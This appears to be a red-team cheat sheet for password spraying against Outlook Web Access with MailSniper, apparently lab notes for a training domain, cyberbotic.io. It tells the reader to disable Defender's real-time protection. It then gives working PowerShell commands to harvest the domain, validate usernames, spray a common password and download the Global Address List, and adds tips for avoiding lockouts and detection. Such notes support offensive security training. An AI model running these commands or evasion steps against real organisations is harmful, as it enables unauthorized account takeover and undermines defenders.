### **Password Spraying**

✅ Disable Defender’s real-time protection before using MailSniper.

### Commands

**Import MailSniper into PowerShell**

```powershell
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

**Enumerate the domain to retrieve NetBIOS**

```powershell
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
```

**Validate usernames from a list**

```powershell
Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```

**Perform password spraying on valid usernames**

```powershell
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```

**Download the Global Address List (optional post-attack)**

```powershell
powershell Get-GlobalAddressList -ExchHostname mail.cyberbotic.io
```

**OPSEC Considerations**

- Avoid multiple attempts in a short time to prevent triggering account lockout policies.

- Plan carefully to minimize detection.

---

### Visual Basic for Applications (VBA) Macros
